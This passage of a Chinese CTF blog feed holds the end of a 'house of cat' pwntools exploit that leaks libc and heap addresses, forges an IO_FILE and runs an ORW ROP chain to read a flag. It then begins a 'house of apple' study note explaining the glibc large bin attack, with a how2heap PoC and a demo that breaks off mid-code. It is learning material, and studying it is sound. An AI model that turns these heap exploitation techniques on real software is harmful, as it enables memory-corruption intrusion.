class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;plz input your cat size:\n&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;plz input your content:\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendafter(<span class="string">&quot;mew mew mew~~~~~~\n&quot;</span>,<span class="string">&#x27;CAT | r00t QWB QWXF$\xff&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;plz input your cat choice:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;plz input your cat idx:\n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendafter(<span class="string">&quot;mew mew mew~~~~~~\n&quot;</span>,<span class="string">&#x27;CAT | r00t QWB QWXF$\xff&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;plz input your cat choice:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;plz input your cat idx:\n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendafter(<span class="string">&quot;mew mew mew~~~~~~\n&quot;</span>,<span class="string">&#x27;CAT | r00t QWB QWXF$\xff&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;plz input your cat choice:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;plz input your cat idx:\n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;plz input your content:\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xe</span>,<span class="number">0x450</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0xd</span>,<span class="number">0x450</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">delete(<span class="number">0xe</span>)</span><br><span class="line">add(<span class="number">0xc</span>,<span class="number">0x460</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">show(<span class="number">0xe</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Context:\n&#x27;</span>)</span><br><span class="line">p.recv(<span class="number">8</span>)</span><br><span class="line">libc_base=recv_libc()-<span class="number">0x21a0e0</span></span><br><span class="line">p.recv(<span class="number">2</span>)</span><br><span class="line">heap_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x290</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">log_addr(<span class="string">&#x27;heap_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">IO_list_all=libc_base+libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">magic_gadget=libc_base+<span class="number">0x16a1fa</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;svcudp_reply+26&gt;:    mov    rbp,QWORD PTR [rdi+0x48]</span></span><br><span class="line"><span class="string">&lt;svcudp_reply+30&gt;:    mov    rax,QWORD PTR [rbp+0x18]</span></span><br><span class="line"><span class="string">&lt;svcudp_reply+34&gt;:    lea    r13,[rbp+0x10]</span></span><br><span class="line"><span class="string">&lt;svcudp_reply+38&gt;:    mov    DWORD PTR [rbp+0x10],0x0</span></span><br><span class="line"><span class="string">&lt;svcudp_reply+45&gt;:    mov    rdi,r13</span></span><br><span class="line"><span class="string">&lt;svcudp_reply+48&gt;:    call   QWORD PTR [rax+0x28]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">leave_ret=libc_base+<span class="number">0x00000000000562ec</span></span><br><span class="line">add_rsp_ret=libc_base+<span class="number">0x000000000003a889</span></span><br><span class="line">stderr_ptr=<span class="number">0x21a860</span>+libc_base</span><br><span class="line">lock=libc_base+<span class="number">0x21ba60</span></span><br><span class="line">pop_rdi=libc_base+<span class="number">0x000000000002a3e5</span></span><br><span class="line">pop_rsi=libc_base+<span class="number">0x000000000002be51</span></span><br><span class="line">pop_rdx_r12=libc_base+<span class="number">0x000000000011f497</span></span><br><span class="line">pop_rax_ret=libc_base+<span class="number">0x0000000000045eb0</span></span><br><span class="line">syscall=libc_base+<span class="number">0xea5b9</span></span><br><span class="line">read_addr=libc_base+libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_addr=libc_base+libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">close_addr=libc_base+libc.symbols[<span class="string">&#x27;close&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xb</span>,<span class="number">0x450</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#close</span></span><br><span class="line">rop=p64(pop_rdi)</span><br><span class="line">rop+=p64(<span class="number">0</span>)</span><br><span class="line">rop+=p64(close_addr)</span><br><span class="line"><span class="comment">#open</span></span><br><span class="line">rop+=p64(pop_rdi)</span><br><span class="line">rop+=p64(heap_base+<span class="number">0x1168</span>)<span class="comment"># &#x27;flag&#x27; address</span></span><br><span class="line">rop+=p64(pop_rsi)</span><br><span class="line">rop+=p64(<span class="number">0</span>)</span><br><span class="line">rop+=p64(pop_rax_ret)</span><br><span class="line">rop+=p64(<span class="number">2</span>)</span><br><span class="line">rop+=p64(syscall)</span><br><span class="line"></span><br><span class="line"><span class="comment">#read</span></span><br><span class="line">rop+=p64(pop_rdi)</span><br><span class="line">rop+=p64(<span class="number">0</span>)</span><br><span class="line">rop+=p64(pop_rsi)</span><br><span class="line">rop+=p64(heap_base+<span class="number">0xb40</span>)<span class="comment"># flag store address</span></span><br><span class="line">rop+=p64(pop_rdx_r12)</span><br><span class="line">rop+=p64(<span class="number">0x50</span>)</span><br><span class="line">rop+=p64(<span class="number">0</span>)</span><br><span class="line">rop+=p64(read_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#write</span></span><br><span class="line">rop+=p64(pop_rdi)</span><br><span class="line">rop+=p64(<span class="number">1</span>)</span><br><span class="line">rop+=p64(pop_rsi)</span><br><span class="line">rop+=p64(heap_base+<span class="number">0xb40</span>)<span class="comment"># flag store address</span></span><br><span class="line">rop+=p64(pop_rdx_r12)</span><br><span class="line">rop+=p64(<span class="number">0x50</span>)</span><br><span class="line">rop+=p64(<span class="number">0</span>)</span><br><span class="line">rop+=p64(write_addr)</span><br><span class="line"></span><br><span class="line">wide_data=p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">1</span>)</span><br><span class="line">wide_data+=p64(<span class="number">0</span>)*<span class="number">20</span></span><br><span class="line">wide_data+=<span class="string">b&quot;flag\x00\x00\x00\x00&quot;</span></span><br><span class="line">wide_data+=p64(<span class="number">0</span>)</span><br><span class="line">wide_data+=p64(<span class="number">0</span>)</span><br><span class="line">wide_data+=p64(heap_base+<span class="number">0x1170</span>)<span class="comment">#wide_vtable</span></span><br><span class="line">wide_data+=p64(magic_gadget)<span class="comment">#first call</span></span><br><span class="line">wide_data+=p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">wide_data+=p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">wide_data+=p64(add_rsp_ret)</span><br><span class="line">wide_data+=p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">wide_data+=p64(<span class="number">0x1178</span>+<span class="number">0x30</span>+heap_base)<span class="comment">#second call</span></span><br><span class="line">wide_data+=p64(leave_ret)</span><br><span class="line">wide_data+=rop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io_file=p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">io_file+=p64(heap_base+<span class="number">0x1180</span>+<span class="number">0x30</span>)<span class="comment">#  rbp   io_save_base</span></span><br><span class="line">io_file+=p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">io_file+=p64(lock)+p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">io_file+=p64(heap_base+<span class="number">0x10a0</span>)<span class="comment">#wide_data</span></span><br><span class="line">io_file+=p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">io_file+=p64(libc_base+<span class="number">0x2160c0</span>+<span class="number">0x10</span>)<span class="comment">#vtable</span></span><br><span class="line">io_file+=wide_data</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x428</span>,io_file)<span class="comment">#0xwfile 2160c0</span></span><br><span class="line">add(<span class="number">0xf</span>,<span class="number">0x460</span>,<span class="string">&#x27;prevent merge chunk&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x418</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x460</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(libc_base+<span class="number">0x21a0d0</span>)*<span class="number">2</span>+p64(IO_list_all)+p64(stderr_ptr-<span class="number">0x20</span>))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x440</span>,<span class="string">&#x27;large bin attack chunk&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x418</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#second large bin attack</span></span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x460</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x430</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x460</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,p64(heap_base+<span class="number">0x2e20</span>)+p64(<span class="number">0x21a0e0</span>+libc_base)+p64(heap_base+<span class="number">0x2e20</span>)+p64(<span class="number">0x3265</span>-<span class="number">2</span>+heap_base-<span class="number">0x20</span>))</span><br><span class="line">  </span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0xe</span>)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x1F04</span>,<span class="number">0x1F10</span>,<span class="number">0x1EF8</span>,<span class="number">0x1EEC</span>,<span class="number">0x177F</span>) </span><br><span class="line">add(<span class="number">0xa</span>,<span class="number">0x450</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x46f</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;mew mew mew~~~~~~\n&quot;</span>,<span class="string">&#x27;CAT | r00t QWB QWXF$\xff&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;plz input your cat choice:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;plz input your cat idx:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">6</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;plz input your cat size:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">0x46f</span>))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302041055201.png" alt="image-20230204105543745"></p>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://blog.csdn.net/m0_51251108/article/details/127290280">(44条消息) house of cat 学习_Nqoinaen的博客-CSDN博客</a></p>
]]></content>
      <categories>
        <category>学习总结</category>
      </categories>
      <tags>
        <tag>伪造IO_FILE</tag>
        <tag>orw</tag>
        <tag>house of cat</tag>
        <tag>large bin attack</tag>
        <tag>malloc_assert</tag>
      </tags>
  </entry>
  <entry>
    <title>关于house of apple的学习总结</title>
    <url>/posts/19609dd.html</url>
    <content><![CDATA[<h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p><code>house of apple</code> 是 <a href="https://roderickchan.github.io/">roderick</a> 师傅提出的一种非常优秀的 <code>IO</code> 攻击利用方法，应该在刚刚学习关于堆的漏洞时便看到 <strong>roderick</strong> 师傅提出的这种利用方法，当时看着文章上出现的很多不认识的名词感慨自己所了解的太少，时隔近七个月现在终于学习到了 <code>house of apple</code> 。而这篇文章仅仅是记录自己关于 <code>house of apple</code> 的学习总结，如果真正要进行对 <code>house of apple</code> 的学习还是建议去看 <strong>roderick</strong> 师傅发表的三篇文章。</p>
<span id="more"></span>

<p><strong>本文所有的 <code>glibc</code> 源代码均来自 <code>2.31</code> 版本</strong></p>
<h3 id="large-bin-attack："><a href="#large-bin-attack：" class="headerlink" title="large bin attack："></a>large bin attack：</h3><p><code>house of apple</code> 的攻击前提通常是使用 <code>large bin attack</code> ，因此需要先介绍一下 <code>glibc</code> 高版本中的 <code>large bin attack</code>。 <code>glibc</code> 低版本的 <code>large bin attack</code> 可以向任意两个地址写入两个堆地址，而高版本的 <code>large bin attack</code> 攻击效果是可以向任意一个地址写入一个堆地址。</p>
<p>漏洞源码如下：</p>
<p>下面代码位于 <code>ptmalloc</code> 遍历 <code>unsorted bin</code> 寻求合适堆块时将堆块分类，使堆块链入 <code>large bin </code> 过程的代码片段</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	victim-&gt;fd_nextsize = fwd;</span><br><span class="line">	victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">	<span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">	malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);</span><br><span class="line">	fwd-&gt;bk_nextsize = victim;</span><br><span class="line">	victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a>漏洞原理：</h5><p>这部分代码存在的问题在于 <code>victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</code> <code>victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</code> 这两行代码中， <code>victim</code> 是将要被链入进 <code>large bin</code> 的堆块，而 <code>fwd</code> 是比 <code>victim</code> 大且位于同一个 <code>large bin</code> 的堆块，如果我们可以控制  <code>fwd-&gt;bk_nextsize</code> 为 <code>target_addr</code>（通过堆溢出或者 <code>UAF</code>），这样在 <code>victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</code> 执行时，就相当于是向 <code>target+0x20</code> 的位置写入 <code>victim</code>。因为 C语言 里访问结构体的成员本质上是通过偏移进行访问的，所以 <code>-&gt;fd_nextsize</code> 相当于 <code>+0x20</code>。</p>
<h5 id="利用过程："><a href="#利用过程：" class="headerlink" title="利用过程："></a>利用过程：</h5><ol>
<li><p>申请一个 <code>堆块A</code>，将其释放掉进入 <code>unsorted bin</code> ，再申请一个比 <code>堆块A</code> 大的 <code>堆块U</code> ,此时 <code>堆块A</code> 进入 <code>large bin</code></p>
</li>
<li><p>申请一个 <code>堆块B</code> ，将其释放进入 <code>unsorted bin</code> 。 <code>堆块B</code> 需要比 <code>堆块A</code> 小且二者需要位于同一个 <code>large bin</code> 中。</p>
</li>
<li><p>利用 <code>堆溢出</code> 或者 <code>UAF</code> 等方式来篡改 <code>堆块A</code> 的 <code>bk_nextsize</code> 为 <code>target_addr-0x20</code></p>
</li>
<li><p>最后释放一个跟 <code>堆块A</code> 和 <code>堆块B</code> 位于同一个 <code>large bin</code> 且比 <code>堆块A</code> 和 <code>堆块B</code> 都大的 <code>堆块C</code></p>
</li>
<li><p>此时触发 <code>large bin attack</code> ，攻击效果是向 <code>target_addr</code> 中写入 <code>堆块B</code> 的地址</p>
<p>举个例子，上述 <code>堆块A</code> <code>堆块B</code> <code>堆块C</code> <code>堆块U</code> 的大小可以分别为 <code>0x428</code> <code>0x418</code> <code>0x438</code> <code>0x438</code></p>
</li>
</ol>
<p><code>poc</code>如下，该 <code>poc</code> 来自 <a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.31/large_bin_attack.c">how2heap</a></p>
<p>然后我把前面一部分翻译成了中文</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">A revisit to large bin attack for after glibc2.30</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Relevant code snippet :</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	if ((unsigned long) (size) &lt; (unsigned long) chunksize_nomask (bck-&gt;bk))&#123;</span></span><br><span class="line"><span class="comment">		fwd = bck;</span></span><br><span class="line"><span class="comment">		bck = bck-&gt;bk;</span></span><br><span class="line"><span class="comment">		victim-&gt;fd_nextsize = fwd-&gt;fd;</span></span><br><span class="line"><span class="comment">		victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span></span><br><span class="line"><span class="comment">		fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span></span><br><span class="line"><span class="comment">	&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">  <span class="comment">/*Disable IO buffering to prevent stream from interfering with heap*/</span></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;自glibc2.30以来，对大型bin块插入实施了两项新检查\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;检查 1 : \n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;    if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;        malloc_printerr (\&quot;malloc(): largebin double linked list corrupted (nextsize)\&quot;);\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Check 2 : \n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;    if (bck-&gt;fd != fwd)\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;        malloc_printerr (\&quot;malloc(): largebin double linked list corrupted (bk)\&quot;);\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;这防止了传统的large bin attack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;然而，仍有一条可能的路径触发large bin attack。PoC如下所示： \n\n&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;====================================================================\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> target = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;以下是我们要覆盖的目标 (%p) : %lu\n\n&quot;</span>,&amp;target,target);</span><br><span class="line">  <span class="type">size_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;首先，我们分配一个大的块[p1] (%p)\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="type">size_t</span> *g1 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;另一个堆块防止合并\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;我们还分配了第二个堆块 [p2]  (%p).\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;此堆块应小于[p1]，并属于同一个large bin.\n&quot;</span>);</span><br><span class="line">  <span class="type">size_t</span> *g2 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;再次分配保护块以防止合并\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;释放两个--&gt;[p1]中较大的一个 --&gt; [p1] (%p)\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="type">size_t</span> *g3 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;分配大于[p1]的块以将[p1]插入large bin\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;释放两个--&gt;[p2]中较小的一个 (%p)\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;此时, we have one chunk in large bin [p1] (%p),\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;               and one chunk in unsorted bin [p2] (%p)\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  p1[<span class="number">3</span>] = (<span class="type">size_t</span>)((&amp;target)<span class="number">-4</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Now modify the p1-&gt;bk_nextsize to [target-0x20] (%p)\n&quot;</span>,(&amp;target)<span class="number">-4</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> *g4 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Finally, allocate another chunk larger than [p2] (%p) to place [p2] (%p) into large bin\n&quot;</span>, p2<span class="number">-2</span>, p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Since glibc does not check chunk-&gt;bk_nextsize if the new inserted chunk is smaller than smallest,\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;  the modified p1-&gt;bk_nextsize does not trigger any error\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Upon inserting [p2] (%p) into largebin, [p1](%p)-&gt;bk_nextsize-&gt;fd-&gt;nexsize is overwritten to address of [p2] (%p)\n&quot;</span>, p2<span class="number">-2</span>, p1<span class="number">-2</span>, p2<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;In out case here, target is now overwritten to address of [p2] (%p), [target] (%p)\n&quot;</span>, p2<span class="number">-2</span>, (<span class="type">void</span> *)target);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Target (%p) : %p\n&quot;</span>,&amp;target,(<span class="type">size_t</span>*)target);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;====================================================================\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  assert((<span class="type">size_t</span>)(p2<span class="number">-2</span>) == target);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>加载源码调试上面的 <code>poc</code> ，基本调试两遍就明白利用过程了。</p>
<h5 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h5><p>上述 <code>large bin attack</code> 的利用是最初在查找网上资料自学的时候看见的做法，但事实上有一个更简单的方法只需要两次进入 <code>large bin</code> 即可（上面的做法是一共用了三次进入 <code>large bin</code> 的堆块）。 </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">      <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">      <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">          size |= PREV_INUSE;</span><br><span class="line">          <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">          assert (chunk_main_arena (bck-&gt;bk));</span><br><span class="line">          <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size)</span><br><span class="line">&lt; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">            &#123;</span><br><span class="line">              fwd = bck;</span><br><span class="line">              bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">              victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">              victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">              fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line">          ...</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<p><code>victim-&gt;fd_nextsize = fwd-&gt;fd;</code> 此处的 <code>fwd-&gt;fd</code> 指向的是唯一存在 <code>large bin</code> 中的堆块，漏洞在下面两行</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br></pre></td></tr></table></figure>

<p>依然是控制 <code>bk_nextsize</code> ，然后向 <code>bk_nextsize-0x20</code> 的位置写一个堆地址 <code>victim</code> 和上面利用一样，举个例子，可以先申请一个 <code>0x428</code> 的堆块进入 <code>large bin</code>，然后去篡改其 <code>bk_nextsize</code> ，再让一个 <code>0x418</code> 的堆块进入 <code>large bin</code> 即可触发 <code>large bin attack</code> </p>
<p><code>demo</code> 如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">//Ubuntu GLIBC 2.35-0ubuntu3.1 </span></span><br><span class="line"><span class="comment">//gcc demo.c -o demo -g -w</span></span><br><span class="line"><span class="type">char</span> data[<span class="number">0x10</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data address -------&gt; %p\n&quot;</span>,&amp;data);<span class="comment">//最终被写入数据的全局变量地址 </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data value   -------&gt; %s\n&quot;</span>,data);<span class="comment">//此时全局的内容为空 </span></span><br><span class="line">    </span><br><span class="line">	<span class="type">void</span> *libc_base=&amp;<span class="built_in">printf</span><span class="number">-0x60770</span>;<span class="comment">//获取libc基地址 </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;libc base address ------&gt; %p\n&quot;</span>,libc_base);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> 